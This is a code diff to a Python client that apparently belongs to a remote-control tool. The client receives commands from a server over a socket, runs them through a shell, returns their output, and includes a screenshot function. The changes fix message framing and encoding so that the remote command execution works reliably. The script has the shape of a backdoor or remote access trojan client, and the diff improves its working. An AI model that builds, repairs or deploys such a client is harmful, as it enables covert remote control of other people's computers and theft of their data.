@@ -10,12 +10,24 @@ def execute_command(command):
     """Execute a system command and return its output or error."""
     try:
         # Run the command and capture output
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding='utf-8', errors='replace')
         output = result.stdout if result.stdout else ""
         error = result.stderr if result.stderr else ""
         return output + error
     except Exception as e:
         return f"Error: {str(e)}"
+
+
+
+def receive_all(sock, size):
+    data = b''
+    while len(data) < size:
+        part = sock.recv(size - len(data))
+        if not part:
+            raise ConnectionError("Socket closed before all data received.")
+        data += part
+    return data
+
 
 
 def get_screenshot():
@@ -37,7 +49,16 @@ def main():
 
         while True:
             # Receive the command from the server
-            request_str = client_socket.recv(1024).decode('utf-8')
+            length_bytes = receive_all(client_socket, 4)
+            if not length_bytes:
+                print("Server closed connection.")
+                return
+
+            length = struct.unpack(">I", length_bytes)[0]
+            request_bytes = receive_all(client_socket, length)
+            request_str = request_bytes.decode('utf-8')
+
+
             if not request_str:
                 print("No command received or server disconnected.")
                 break
@@ -47,13 +68,16 @@ def main():
             # Execute the command
             result = execute_command(request["command"])
             print(f"Command output: {result}")
-            print(len(result))
 
-            # Send the result back to the server
-            size = struct.pack(">I", len(result))
-            client_socket.send(size)
-            client_socket.send(result.encode('utf-8'))
+            # Encode the result to UTF-8 bytes BEFORE getting the length
+            encoded_result = result.encode('utf-8')
+            print(f"Encoded byte length: {len(encoded_result)}")
+
+            # Send the result with correct byte length
+            size = struct.pack(">I", len(encoded_result))
+            client_socket.sendall(size + encoded_result)
             print("Result sent to server.")
+
 
 
     except Exception as e:
